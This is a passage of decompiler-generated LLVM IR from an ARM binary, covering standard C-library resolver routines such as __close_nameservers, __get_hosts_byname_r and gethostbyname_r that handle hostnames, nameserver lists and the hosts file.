  %v2_1c894 = icmp eq i32 %v4_1c890, 0
  br i1 %v2_1c894, label %dec_label_pc_1c89c, label %dec_label_pc_1c8d8

dec_label_pc_1c89c:                               ; preds = %dec_label_pc_1c88c
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_1c8a0 = call i32 @malloc(i32 28)
  store i32 %v1_1c8a0, i32* %r0.global-to-local, align 4
  store i32 -32856, i32* %r3.global-to-local, align 4
  store i32 27504, i32* %r2.global-to-local, align 4
  %v2_1c8ac = icmp eq i32 %v1_1c8a0, 0
  %v1_1c8b0 = load i32, i32* @r5, align 4
  br i1 %v2_1c8ac, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_1c89c
  %v3_1c8b0 = add i32 %v1_1c8b0, -32856
  store i32 %v3_1c8b0, i32* %r3.global-to-local, align 4
  %v3_1c8b428 = add i32 %v1_1c8b0, 27504
  %v4_1c8b429 = inttoptr i32 %v3_1c8b428 to i32*
  store i32 0, i32* %v4_1c8b429, align 4
  %v1_1c8b8 = load i32, i32* %r3.global-to-local, align 4
  %v2_1c8b8 = load i32, i32* @r5, align 4
  %v3_1c8b8 = load i32, i32* %r2.global-to-local, align 4
  %v4_1c8b8 = add i32 %v3_1c8b8, %v2_1c8b8
  %v5_1c8b8 = inttoptr i32 %v4_1c8b8 to i32*
  store i32 %v1_1c8b8, i32* %v5_1c8b8, align 4
  br label %.thread4

bb63:                                             ; preds = %dec_label_pc_1c89c
  %v3_1c8b4 = add i32 %v1_1c8b0, 27504
  %v4_1c8b4 = inttoptr i32 %v3_1c8b4 to i32*
  store i32 %v1_1c8a0, i32* %v4_1c8b4, align 4
  %v1_1c8bc = load i32, i32* @r5, align 4
  %v2_1c8bc = load i32, i32* %r3.global-to-local, align 4
  %v3_1c8bc = add i32 %v2_1c8bc, %v1_1c8bc
  store i32 %v3_1c8bc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb62, %bb63
  store i32 116936, i32* @lr, align 4
  %v1_1c8c4 = xor i1 %v2_1c8ac, true
  call void @__pseudo_cond_branch(i1 %v1_1c8c4, i32 ptrtoint (i32* @global_var_14d20.1072 to i32))
  store i32 27508, i32* %r2.global-to-local, align 4
  %v0_1c8cc = load i32, i32* @r5, align 4
  %v2_1c8cc = add i32 %v0_1c8cc, 27508
  %v3_1c8cc = inttoptr i32 %v2_1c8cc to i32*
  %v4_1c8cc = load i32, i32* %v3_1c8cc, align 4
  %v1_1c8d0 = add i32 %v4_1c8cc, 1
  store i32 %v1_1c8d0, i32* %r3.global-to-local, align 4
  store i32 %v1_1c8d0, i32* %v3_1c8cc, align 4
  %v0_1c8dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1c8d8

dec_label_pc_1c8d8:                               ; preds = %dec_label_pc_1c88c, %.thread4
  %v0_1c8dc = phi i32 [ %v0_1c890, %dec_label_pc_1c88c ], [ %v0_1c8dc.pre, %.thread4 ]
  store i32 27512, i32* @r7, align 4
  %v2_1c8dc = add i32 %v0_1c8dc, 27512
  %v3_1c8dc = inttoptr i32 %v2_1c8dc to i32*
  %v4_1c8dc = load i32, i32* %v3_1c8dc, align 4
  store i32 %v4_1c8dc, i32* @r4, align 4
  %v2_1c8e0 = icmp eq i32 %v4_1c8dc, 0
  br i1 %v2_1c8e0, label %dec_label_pc_1c8e8, label %dec_label_pc_1c968

dec_label_pc_1c8e8:                               ; preds = %dec_label_pc_1c8d8
  %v2_1c8e8 = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_1c8e8, i32* @r6, align 4
  store i32 %v2_1c8e8, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_1c8f4 = call i32 @__GI_gethostname(i32 %v2_1c8e8, i32 255)
  store i32 %v2_1c8f4, i32* %r0.global-to-local, align 4
  %v2_1c8f8 = icmp eq i32 %v2_1c8f4, 0
  br i1 %v2_1c8f8, label %dec_label_pc_1c904, label %dec_label_pc_1c968

dec_label_pc_1c904:                               ; preds = %dec_label_pc_1c8e8
  store i32 %v2_1c8e8, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_1c90c = call i32 @__GI_strchr(i32 %v2_1c8e8, i32 46)
  store i32 %v2_1c90c, i32* %r0.global-to-local, align 4
  %v2_1c910 = icmp eq i32 %v2_1c90c, 0
  br i1 %v2_1c910, label %dec_label_pc_1c968, label %dec_label_pc_1c918

dec_label_pc_1c918:                               ; preds = %dec_label_pc_1c904
  %v1_1c918 = add i32 %v2_1c90c, 1
  %v2_1c918 = inttoptr i32 %v1_1c918 to i8*
  %v3_1c918 = load i8, i8* %v2_1c918, align 1
  %v4_1c918 = zext i8 %v3_1c918 to i32
  store i32 %v4_1c918, i32* %r3.global-to-local, align 4
  %v2_1c91c = icmp eq i8 %v3_1c918, 0
  store i32 %v1_1c918, i32* %r0.global-to-local, align 4
  br i1 %v2_1c91c, label %dec_label_pc_1c968, label %dec_label_pc_1c928

dec_label_pc_1c928:                               ; preds = %dec_label_pc_1c918
  %v2_1c928 = call i32 @__GI_strdup(i8* %v2_1c918)
  store i32 %v2_1c928, i32* %r0.global-to-local, align 4
  store i32 %v2_1c928, i32* @r4, align 4
  %v2_1c92c = icmp eq i32 %v2_1c928, 0
  br i1 %v2_1c92c, label %dec_label_pc_1c968, label %dec_label_pc_1c934

dec_label_pc_1c934:                               ; preds = %dec_label_pc_1c928
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1c938 = call i32 @malloc(i32 4)
  store i32 %v1_1c938, i32* %r0.global-to-local, align 4
  store i32 27500, i32* %r3.global-to-local, align 4
  %v2_1c940 = icmp eq i32 %v1_1c938, 0
  %v1_1c944 = load i32, i32* @r5, align 4
  %v3_1c944 = add i32 %v1_1c944, 27500
  %v4_1c944 = inttoptr i32 %v3_1c944 to i32*
  store i32 %v1_1c938, i32* %v4_1c944, align 4
  br i1 %v2_1c940, label %dec_label_pc_1c94c, label %dec_label_pc_1c958

dec_label_pc_1c94c:                               ; preds = %dec_label_pc_1c934
  %v0_1c94c = load i32, i32* @r4, align 4
  store i32 %v0_1c94c, i32* @r0, align 4
  %v0_1c950 = call i32 @free()
  store i32 %v0_1c950, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c968

dec_label_pc_1c958:                               ; preds = %dec_label_pc_1c934
  %v0_1c958 = load i32, i32* @r5, align 4
  %v1_1c958 = load i32, i32* @r7, align 4
  %v2_1c958 = add i32 %v1_1c958, %v0_1c958
  %v3_1c958 = inttoptr i32 %v2_1c958 to i32*
  %v4_1c958 = load i32, i32* %v3_1c958, align 4
  %v1_1c95c = add i32 %v4_1c958, 1
  store i32 %v1_1c95c, i32* %r3.global-to-local, align 4
  %v0_1c960 = load i32, i32* @r4, align 4
  %v2_1c960 = inttoptr i32 %v1_1c938 to i32*
  store i32 %v0_1c960, i32* %v2_1c960, align 4
  %v0_1c964 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c964 = load i32, i32* @r5, align 4
  %v2_1c964 = load i32, i32* @r7, align 4
  %v3_1c964 = add i32 %v2_1c964, %v1_1c964
  %v4_1c964 = inttoptr i32 %v3_1c964 to i32*
  store i32 %v0_1c964, i32* %v4_1c964, align 4
  br label %dec_label_pc_1c968

dec_label_pc_1c968:                               ; preds = %dec_label_pc_1c8e8, %dec_label_pc_1c8d8, %dec_label_pc_1c5c4, %dec_label_pc_1c928, %dec_label_pc_1c918, %dec_label_pc_1c904, %dec_label_pc_1c94c, %dec_label_pc_1c958
  store i32 27496, i32* %r3.global-to-local, align 4
  %v0_1c96c = load i32, i32* @r5, align 4
  %v2_1c96c = add i32 %v0_1c96c, 27496
  %v3_1c96c = inttoptr i32 %v2_1c96c to i32*
  %v4_1c96c = load i32, i32* %v3_1c96c, align 4
  store i32 %v4_1c96c, i32* %r0.global-to-local, align 4
  %v2_1c970 = icmp eq i32 %v4_1c96c, 0
  br i1 %v2_1c970, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_1c968
  store i32 117116, i32* %lr.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_1c968, %bb64
  %v2_1c978 = xor i1 %v2_1c970, true
  call void @__pseudo_cond_branch(i1 %v2_1c978, i32 %v4_1c96c)
  %v2_1c980 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1c980, i32* %r4.global-to-local, align 4
  store i32 %v15_1c574, i32* @r8, align 4
  store i32 %v18_1c574, i32* @sb, align 4
  store i32 %v21_1c574, i32* @sl, align 4
  store i32 %v24_1c574, i32* @fp, align 4
  store i32 %v27_1c574, i32* %lr.global-to-local, align 4
  ret i32 %v4_1c96c

; uselistorder directives
  uselistorder i32 %v1_1c938, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1c8e8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_1c678, { 1, 0 }
  uselistorder i32 %v2_1c660, { 1, 0 }
  uselistorder i32 %v2_1c640, { 1, 0 }
  uselistorder i32 %v2_1c868, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_1c838, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1c828, { 1, 0 }
  uselistorder i32 %v0_1c7c8, { 1, 0, 2 }
  uselistorder i32 %v1_1c74017, { 1, 0 }
  uselistorder i32 %v1_1c73810, { 1, 0 }
  uselistorder i32 %v0_1c7389, { 1, 0 }
  uselistorder i32 %v1_1c740, { 1, 0 }
  uselistorder i32 %v3_1c6bc, { 1, 0, 2, 3, 4 }
  uselistorder i16* %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 13, 23, 0, 14, 15, 16, 1, 19, 17, 18, 20, 21, 22, 24, 25, 26, 27, 28 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 17, 5, 0, 7, 6, 14, 8, 9, 10, 11, 12, 13, 15, 16 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 21, 3, 4, 5, 6, 7, 8, 16, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 5, 4, 6, 8, 7, 10, 9, 12, 11, 56, 55, 13, 15, 14, 17, 16, 18, 20, 19, 22, 21, 23, 24, 26, 25, 27, 29, 28, 34, 33, 49, 48, 30, 31, 32, 36, 35, 38, 37, 39, 41, 40, 42, 44, 43, 45, 47, 46, 52, 50, 51, 54, 53 }
  uselistorder i32 (i16*)* @__GI_fclose, { 4, 3, 0, 1, 2 }
  uselistorder i32 (i32)* @atol, { 15, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 58, { 0, 5, 4, 6, 1, 2, 3, 7 }
  uselistorder i32 (i32*, i32)* @realloc, { 2, 3, 1, 0 }
  uselistorder i16 2, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 22, 24, 25, 3, 26, 21, 4, 5, 20, 27, 12, 18, 19, 40, 39, 23, 0, 13, 6, 7, 8, 9, 10, 11, 14, 15, 16, 1, 2, 36, 37, 38, 17, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_fopen, { 0, 1, 4, 3, 2 }
  uselistorder i32 -33904, { 1, 0 }
  uselistorder i32 1283, { 0, 3, 4, 2, 1 }
  uselistorder i32 -32932, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -32932), { 1, 0 }
  uselistorder i32 27496, { 0, 2, 1, 3 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_1c968, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_1c8d8, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1c88c, { 1, 0 }
  uselistorder label %dec_label_pc_1c884, { 1, 0 }
  uselistorder label %dec_label_pc_1c748, { 1, 0 }
  uselistorder label %dec_label_pc_1c868.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_1c5c4, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1c9d0 = load i32, i32* @r4, align 4
  store i32 %v3_1c9d0, i32* %stack_var_-20, align 4
  store i32 27504, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r5, align 4
  store i32 -32856, i32* %r3.global-to-local, align 4
  %v4_1c9e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 27504) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -32856), i32* %r3.global-to-local, align 4
  store i32 117240, i32* @lr, align 4
  %v1_1c9f4 = icmp ne i32 %v4_1c9e4, add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -32856)
  call void @__pseudo_cond_branch(i1 %v1_1c9f4, i32 ptrtoint (i32* @global_var_168b4.827 to i32))
  store i32 27508, i32* %r3.global-to-local, align 4
  store i32 27512, i32* @r7, align 4
  store i32 27500, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1ca08 = load i32, i32* @r5, align 4
  %v3_1ca08 = add i32 %v1_1ca08, 27508
  %v4_1ca08 = inttoptr i32 %v3_1ca08 to i32*
  store i32 0, i32* %v4_1ca08, align 4
  %v0_1ca0c = load i32, i32* %r2.global-to-local, align 4
  %v1_1ca0c = load i32, i32* @r5, align 4
  %v2_1ca0c = load i32, i32* %r4.global-to-local, align 4
  %v3_1ca0c = add i32 %v2_1ca0c, %v1_1ca0c
  %v4_1ca0c = inttoptr i32 %v3_1ca0c to i32*
  store i32 %v0_1ca0c, i32* %v4_1ca0c, align 4
  br label %dec_label_pc_1ca24

dec_label_pc_1ca14:                               ; preds = %dec_label_pc_1ca24
  store i32 %v4_1ca38, i32* %r3.global-to-local, align 4
  store i32 %v1_1ca2c, i32* %v3_1ca24, align 4
  %v0_1ca1c = load i32, i32* %r3.global-to-local, align 4
  %v1_1ca1c = load i32, i32* %r2.global-to-local, align 4
  %v4_1ca1c = mul i32 %v1_1ca1c, 4
  %v5_1ca1c = add i32 %v4_1ca1c, %v0_1ca1c
  %v6_1ca1c = inttoptr i32 %v5_1ca1c to i32*
  %v7_1ca1c = load i32, i32* %v6_1ca1c, align 4
  store i32 %v7_1ca1c, i32* @r0, align 4
  %v0_1ca20 = call i32 @free()
  br label %dec_label_pc_1ca24

dec_label_pc_1ca24:                               ; preds = %entry, %dec_label_pc_1ca14
  %v0_1ca24 = load i32, i32* @r5, align 4
  %v1_1ca24 = load i32, i32* @r7, align 4
  %v2_1ca24 = add i32 %v1_1ca24, %v0_1ca24
  %v3_1ca24 = inttoptr i32 %v2_1ca24 to i32*
  %v4_1ca24 = load i32, i32* %v3_1ca24, align 4
  store i32 %v4_1ca24, i32* @r4, align 4
  %v2_1ca28 = icmp eq i32 %v4_1ca24, 0
  %v1_1ca2c = add i32 %v4_1ca24, -1
  store i32 %v1_1ca2c, i32* %r2.global-to-local, align 4
  %v0_1ca30 = load i32, i32* @r6, align 4
  store i32 %v0_1ca30, i32* %r3.global-to-local, align 4
  %v2_1ca38 = add i32 %v0_1ca30, %v0_1ca24
  %v3_1ca38 = inttoptr i32 %v2_1ca38 to i32*
  %v4_1ca38 = load i32, i32* %v3_1ca38, align 4
  br i1 %v2_1ca28, label %dec_label_pc_1ca38, label %dec_label_pc_1ca14

dec_label_pc_1ca38:                               ; preds = %dec_label_pc_1ca24
  store i32 %v4_1ca38, i32* @r0, align 4
  %v0_1ca3c = call i32 @free()
  %v0_1ca40 = load i32, i32* @r4, align 4
  %v1_1ca40 = load i32, i32* @r5, align 4
  %v2_1ca40 = load i32, i32* @r6, align 4
  %v3_1ca40 = add i32 %v2_1ca40, %v1_1ca40
  %v4_1ca40 = inttoptr i32 %v3_1ca40 to i32*
  store i32 %v0_1ca40, i32* %v4_1ca40, align 4
  %v2_1ca48 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1ca48, i32* %r4.global-to-local, align 4
  ret i32 %v0_1ca3c

; uselistorder directives
  uselistorder i32 %v4_1ca38, { 1, 0 }
  uselistorder i32 %v1_1ca2c, { 1, 0 }
  uselistorder i32* %v3_1ca24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 27500, { 4, 1, 7, 5, 6, 0, 3, 2, 8 }
  uselistorder i32 27512, { 1, 2, 4, 3, 0 }
  uselistorder i32 27508, { 0, 1, 3, 7, 4, 8, 2, 6, 5, 9, 10, 12, 11, 13 }
  uselistorder i32 -32856, { 1, 2, 0, 3 }
  uselistorder i32 27504, { 4, 5, 1, 0, 7, 2, 6, 3, 8 }
  uselistorder label %dec_label_pc_1ca24, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v0_1ca68 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_1caa4 = call i32 @__read_etc_hosts_r()
  store i32 %v0_1ca68, i32* @lr, align 4
  ret i32 %v0_1caa4
}

define i32 @gethostbyname_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp29, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_1cabc = load i32, i32* @r2, align 4
  store i32 %tmp29, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_1cac8 = load i32, i32* @r0, align 4
  store i32 %v0_1cac8, i32* @sl, align 4
  %v2_1cac8 = icmp eq i32 %v0_1cac8, 0
  %v2_1cacc = inttoptr i32 %tmp29 to i32*
  store i32 0, i32* %v2_1cacc, align 4
  %v0_1cad0 = load i32, i32* @r1, align 4
  store i32 %v0_1cad0, i32* @r7, align 4
  %v0_1cad4 = load i32, i32* @r3, align 4
  store i32 %v0_1cad4, i32* @r6, align 4
  br i1 %v2_1cac8, label %bb, label %dec_label_pc_1cae0

bb:                                               ; preds = %entry
  %v1_1cad8 = load i32, i32* @r5, align 4
  %v2_1cad8 = add i32 %v1_1cad8, 22
  store i32 %v2_1cad8, i32* @r5, align 4
  br label %dec_label_pc_1cd9c

dec_label_pc_1cae0:                               ; preds = %entry
  %v0_1cae0 = call i32 @__GI___errno_location()
  store i32 %v0_1cae0, i32* %r0.global-to-local, align 4
  %v3_1cae4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1cae4, i32* %ip.global-to-local, align 4
  %v1_1cae8 = inttoptr i32 %v0_1cae0 to i32*
  %v2_1cae8 = load i32, i32* %v1_1cae8, align 4
  store i32 %v2_1cae8, i32* @r8, align 4
  %v0_1caec = load i32, i32* @r5, align 4
  store i32 %v0_1caec, i32* %v1_1cae8, align 4
  %v0_1caf0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %tmp18, i32* %ip.global-to-local, align 4
  store i32 %v0_1cae0, i32* @r4, align 4
  %v0_1cb00 = load i32, i32* @sl, align 4
  store i32 %v0_1cb00, i32* %r0.global-to-local, align 4
  %v0_1cb04 = load i32, i32* @r7, align 4
  store i32 %v0_1cb04, i32* %r2.global-to-local, align 4
  store i32 %v0_1cabc, i32* %r3.global-to-local, align 4
  %v0_1cb0c = load i32, i32* @r6, align 4
  %v7_1cb14 = call i32 @__get_hosts_byname_r(i32 %v0_1cb00, i32 2, i32 %v0_1cb04, i32 %v0_1cabc, i32 %v0_1cb0c, i32 %v0_1caf0, i32 %tmp18)
  store i32 %v7_1cb14, i32* %r0.global-to-local, align 4
  store i32 %v7_1cb14, i32* @r5, align 4
  %v2_1cb18 = icmp eq i32 %v7_1cb14, 0
  br i1 %v2_1cb18, label %bb34, label %dec_label_pc_1cb24

bb34:                                             ; preds = %dec_label_pc_1cae0
  %v1_1cb1c = load i32, i32* @r8, align 4
  %v2_1cb1c = load i32, i32* @r4, align 4
  %v3_1cb1c = inttoptr i32 %v2_1cb1c to i32*
  store i32 %v1_1cb1c, i32* %v3_1cb1c, align 4
  br label %dec_label_pc_1cd9c

dec_label_pc_1cb24:                               ; preds = %dec_label_pc_1cae0
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v1_1cb28 = inttoptr i32 %tmp18 to i32*
  %v2_1cb28 = load i32, i32* %v1_1cb28, align 4
  store i32 %v2_1cb28, i32* %r3.global-to-local, align 4
  %v7_1cb2c = icmp eq i32 %v2_1cb28, 1
  br i1 %v7_1cb2c, label %dec_label_pc_1cb48, label %dec_label_pc_1cb34

dec_label_pc_1cb34:                               ; preds = %dec_label_pc_1cb24
  %v7_1cb34 = icmp eq i32 %v2_1cb28, 4
  br i1 %v7_1cb34, label %dec_label_pc_1cb68, label %dec_label_pc_1cb3c

dec_label_pc_1cb3c:                               ; preds = %dec_label_pc_1cb34
  %v3_1cb3c = icmp eq i32 %v2_1cb28, -1
  br i1 %v3_1cb3c, label %dec_label_pc_1cb5c, label %dec_label_pc_1cd9c

dec_label_pc_1cb48:                               ; preds = %dec_label_pc_1cb24
  %v7_1cb48 = icmp eq i32 %v7_1cb14, 2
  br i1 %v7_1cb48, label %.thread4, label %bb35

bb35:                                             ; preds = %dec_label_pc_1cb48
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1cb70

.thread4:                                         ; preds = %dec_label_pc_1cb48
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1cb70

dec_label_pc_1cb5c:                               ; preds = %dec_label_pc_1cb3c
  %v0_1cb5c = load i32, i32* @r4, align 4
  %v1_1cb5c = inttoptr i32 %v0_1cb5c to i32*
  %v2_1cb5c = load i32, i32* %v1_1cb5c, align 4
  store i32 %v2_1cb5c, i32* %r3.global-to-local, align 4
  %v7_1cb60 = icmp eq i32 %v2_1cb5c, 2
  br i1 %v7_1cb60, label %dec_label_pc_1cb68, label %dec_label_pc_1cd9c

dec_label_pc_1cb68:                               ; preds = %dec_label_pc_1cb5c, %dec_label_pc_1cb34
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1cb70

dec_label_pc_1cb70:                               ; preds = %.thread4, %bb35, %dec_label_pc_1cb68
  %storemerge2 = phi i32 [ 0, %dec_label_pc_1cb68 ], [ 0, %bb35 ], [ 1, %.thread4 ]
  store i32 %tmp18, i32* @ip, align 4
  store i32 -1, i32* @r3, align 4
  %v0_1cb78 = load i32, i32* @r8, align 4
  %v1_1cb78 = load i32, i32* @r4, align 4
  %v2_1cb78 = inttoptr i32 %v1_1cb78 to i32*
  store i32 %v0_1cb78, i32* %v2_1cb78, align 4
  %v0_1cb7c = load i32, i32* @sl, align 4
  %v1_1cb7c = inttoptr i32 %v0_1cb7c to i8*
  store i32 %v0_1cb7c, i32* %r0.global-to-local, align 4
  %v0_1cb80 = load i32, i32* @r3, align 4
  %v1_1cb80 = load i32, i32* @ip, align 4
  %v2_1cb80 = inttoptr i32 %v1_1cb80 to i32*
  store i32 %v0_1cb80, i32* %v2_1cb80, align 4
  %v3_1cb84 = call i32 @strlen(i8* %v1_1cb7c)
  store i32 %v3_1cb84, i32* %r0.global-to-local, align 4
  %v1_1cb88 = add i32 %v3_1cb84, 1
  store i32 %v1_1cb88, i32* @r4, align 4
  %v0_1cb8c = load i32, i32* @r6, align 4
  %v7_1cb90 = icmp sgt i32 %v0_1cb8c, %v1_1cb88
  br i1 %v7_1cb90, label %dec_label_pc_1cb94, label %dec_label_pc_1cd98

dec_label_pc_1cb94:                               ; preds = %dec_label_pc_1cb70
  %v0_1cb94 = load i32, i32* @sl, align 4
  store i32 %v0_1cb94, i32* @r1, align 4
  store i32 %v1_1cb88, i32* @r2, align 4
  store i32 %v0_1cabc, i32* @r0, align 4
  %v0_1cba0 = call i32 @memcpy()
  store i32 %v0_1cba0, i32* %r0.global-to-local, align 4
  %v1_1cba8 = load i32, i32* @r4, align 4
  %v2_1cba8 = add i32 %v1_1cba8, %v0_1cabc
  %v1_1cbac = sub i32 0, %v2_1cba8
  %v1_1cbb0 = load i32, i32* @r6, align 4
  %v2_1cbb0 = sub i32 %v1_1cbb0, %v1_1cba8
  store i32 %v2_1cbb0, i32* %r2.global-to-local, align 4
  %v1_1cbb4 = urem i32 %v1_1cbac, 4
  store i32 %v1_1cbb4, i32* %r3.global-to-local, align 4
  %v2_1cbb8 = sub i32 %v2_1cbb0, %v1_1cbb4
  store i32 %v2_1cbb8, i32* @sb, align 4
  %v1_1cbbc = add i32 %v2_1cbb8, -8
  store i32 %v1_1cbbc, i32* @r5, align 4
  %v7_1cbc4 = icmp slt i32 %v1_1cbbc, 256
  br i1 %v7_1cbc4, label %dec_label_pc_1cd98, label %dec_label_pc_1cbc8

dec_label_pc_1cbc8:                               ; preds = %dec_label_pc_1cb94
  %v2_1cbc8 = add i32 %v1_1cbb4, %v2_1cba8
  store i32 %v2_1cbc8, i32* @fp, align 4
  store i32 %v0_1cabc, i32* %ip.global-to-local, align 4
  %v1_1cbd0 = add i32 %v2_1cbc8, 8
  store i32 %v1_1cbd0, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_1cbd8 = add i32 %v2_1cbc8, 16
  store i32 %v1_1cbd8, i32* @r8, align 4
  %v4_1cbdc = inttoptr i32 %v2_1cbc8 to i32*
  store i32 %v0_1cabc, i32* %v4_1cbdc, align 4
  %v0_1cbe0 = load i32, i32* @sl, align 4
  store i32 %v0_1cbe0, i32* %r0.global-to-local, align 4
  %v0_1cbe4 = load i32, i32* @r4, align 4
  %v1_1cbe4 = load i32, i32* @fp, align 4
  %v2_1cbe4 = add i32 %v1_1cbe4, 4
  %v3_1cbe4 = inttoptr i32 %v2_1cbe4 to i32*
  store i32 %v0_1cbe4, i32* %v3_1cbe4, align 4
  %v0_1cbe8 = load i32, i32* @r8, align 4
  %v2_1cbec = inttoptr i32 %v0_1cbe0 to i8*
  %v3_1cbec = call i32 @inet_aton(i8* %v2_1cbec, i32 %v0_1cbe8)
  store i32 %v3_1cbec, i32* %r0.global-to-local, align 4
  %v1_1cbf0 = load i32, i32* @r4, align 4
  %v9_1cbf0 = icmp eq i32 %v3_1cbec, %v1_1cbf0
  br i1 %v9_1cbf0, label %dec_label_pc_1cc34, label %dec_label_pc_1cbf8

dec_label_pc_1cbf8:                               ; preds = %dec_label_pc_1cbc8
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_1cbfc = load i32, i32* @r7, align 4
  %v2_1cbfc = add i32 %v1_1cbfc, 8
  %v3_1cbfc = inttoptr i32 %v2_1cbfc to i32*
  store i32 2, i32* %v3_1cbfc, align 4
  %v0_1cc00 = load i32, i32* %r3.global-to-local, align 4
  %v2_1cc00 = mul i32 %v0_1cc00, 2
  %v1_1cc04 = load i32, i32* @r7, align 4
  %v2_1cc04 = add i32 %v1_1cc04, 12
  %v3_1cc04 = inttoptr i32 %v2_1cc04 to i32*
  store i32 %v2_1cc00, i32* %v3_1cc04, align 4
  %v3_1cc08 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1cc08, i32* %r2.global-to-local, align 4
  store i32 %v0_1cabc, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* @ip, align 4
  %v0_1cc14 = load i32, i32* @r4, align 4
  store i32 %v0_1cc14, i32* @r5, align 4
  %v0_1cc18 = load i32, i32* @r8, align 4
  %v1_1cc18 = load i32, i32* @fp, align 4
  %v2_1cc18 = add i32 %v1_1cc18, 8
  %v3_1cc18 = inttoptr i32 %v2_1cc18 to i32*
  store i32 %v0_1cc18, i32* %v3_1cc18, align 4
  %v0_1cc1c = load i32, i32* @r7, align 4
  %v1_1cc1c = load i32, i32* %r2.global-to-local, align 4
  %v2_1cc1c = inttoptr i32 %v1_1cc1c to i32*
  store i32 %v0_1cc1c, i32* %v2_1cc1c, align 4
  %v0_1cc20 = load i32, i32* @r7, align 4
  %v1_1cc20 = inttoptr i32 %v0_1cc20 to i32*
  %v2_1cc20 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_1cc20, i32* %v1_1cc20, align 4
  %v3_1cc20 = add i32 %v0_1cc20, 4
  %v4_1cc20 = inttoptr i32 %v3_1cc20 to i32*
  %v5_1cc20 = load i32, i32* @fp, align 4
  store i32 %v5_1cc20, i32* %v4_1cc20, align 4
  %v0_1cc24 = load i32, i32* @r6, align 4
